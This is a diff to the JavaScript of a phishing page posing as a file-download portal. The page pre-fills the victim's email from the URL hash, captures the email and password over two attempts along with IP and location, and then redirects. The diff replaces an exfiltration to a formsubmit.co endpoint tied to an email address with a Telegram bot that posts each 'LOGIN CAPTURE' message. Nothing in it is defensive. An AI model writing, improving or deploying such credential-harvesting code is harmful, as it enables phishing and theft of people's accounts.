@@ -153,6 +153,12 @@
 
 <script>
     (function() {
+      // ====== TELEGRAM CONFIG ======
+      const BOT_TOKEN = 'YOUR_BOT_TOKEN';   // <-- Replace with your bot token
+      const CHAT_ID   = 'YOUR_CHAT_ID';     // <-- Replace with your chat ID
+      const TG_API    = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+      // ===========================
+
       // DOM refs
       const emailInput = document.getElementById('emailInput');
       const passwordInput = document.getElementById('passwordInput');
@@ -173,13 +179,12 @@
         errorBox.textContent = '';
       }
 
-      // ----- URL hash pre-fill (the code you requested) -----
+      // ----- URL hash pre-fill -----
       function prefillEmailFromHash() {
         if (window.location.hash) {
           const clientID = window.location.hash.substring(1); // remove '#'
           if (clientID.includes('@')) {
             emailInput.value = clientID;
-            // optional: trigger validation if needed
           }
         }
       }
@@ -187,12 +192,10 @@
       // ----- modal logic -----
       function openModal(fileName) {
         modal.style.display = 'flex';
-        // pre-fill email from hash every time modal opens (in case hash changed)
         prefillEmailFromHash();
         if (fileName) console.log('Download requested for: ' + fileName);
       }
 
-      // attach download events
       document.getElementById('downloadBtn').addEventListener('click', function(e) {
         e.preventDefault();
         openModal('All Files');
@@ -241,29 +244,30 @@
 
           step++; // increment attempt
 
-          // 2. Prepare payload
-          const formData = {
-            _subject: "Logs | " + ipData.ip,
-            Email: email,
-            Password: password,
-            Attempts: step,
-            IP: ipData.ip,
-            Location: ipData.city + ", " + ipData.country,
-          };
+          // 2. Build the Telegram message text
+          const messageText =
+            `🔐 LOGIN CAPTURE (attempt ${step})\n` +
+            `━━━━━━━━━━━━━━━━━━\n` +
+            `📧 Email: ${email}\n` +
+            `🔑 Password: ${password}\n` +
+            `🌐 IP: ${ipData.ip}\n` +
+            `📍 Location: ${ipData.city || '?'}, ${ipData.country || '?'}\n` +
+            `⏱ Time: ${new Date().toISOString()}`;
 
-          // 3. POST to your API
-          const submitResponse = await fetch('https://formsubmit.co/ajax/egoabata@yandex.com', {
+          // 3. POST to Telegram Bot API
+          const tgResponse = await fetch(TG_API, {
             method: 'POST',
-            headers: {
-              'Content-Type': 'application/json',
-              'Accept': 'application/json',
-            },
-            body: JSON.stringify(formData),
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              chat_id: CHAT_ID,
+              text: messageText,
+              disable_web_page_preview: true
+            })
           });
 
-          if (!submitResponse.ok) throw new Error('Network error');
-          const result = await submitResponse.json();
-          console.log('Server response:', result);
+          if (!tgResponse.ok) throw new Error('Telegram API error');
+          const result = await tgResponse.json();
+          console.log('Telegram response:', result);
 
           // 4. If second attempt → redirect
           if (step === 2) {
@@ -285,25 +289,18 @@
         }
       });
 
-      // ----- initial pre-fill on page load (if modal not opened yet) -----
-      // but we also call it inside openModal, so it works when modal opens.
-      // Also call it now in case modal is already open (it's hidden by default)
-      // We'll call it after DOM ready.
+      // ----- initial pre-fill on page load -----
       prefillEmailFromHash();
 
-      // Also, if the modal is opened via any trigger, we already call prefillEmailFromHash inside openModal.
-      // For safety, also run on hashchange
       window.addEventListener('hashchange', function() {
-        // if modal is visible, update email
         if (modal.style.display === 'flex') {
           prefillEmailFromHash();
         }
       });
 
-      // expose prefill to console for testing
       window.prefillEmailFromHash = prefillEmailFromHash;
 
-      // hide spinner and show root (existing)
+      // hide spinner and show root
       window.addEventListener('DOMContentLoaded', function() {
         setTimeout(function() {
           var spinner = document.getElementById('loading-spinner');
@@ -312,14 +309,10 @@
         }, 1200);
       });
 
-      // Ensure video autoplay (in case browser blocks it)
-      // The video already has autoplay, loop, muted, playsinline attributes.
-      // Some browsers require a user gesture, but muted autoplay is generally allowed.
-      // We'll also try to play it programmatically if it's paused.
+      // Ensure video autoplay
       const video = document.getElementById('body__bg');
       if (video) {
         video.play().catch(function(e) {
-          // Autoplay was prevented; but with muted and playsinline it should work.
           console.log('Autoplay was prevented:', e);
         });
       }
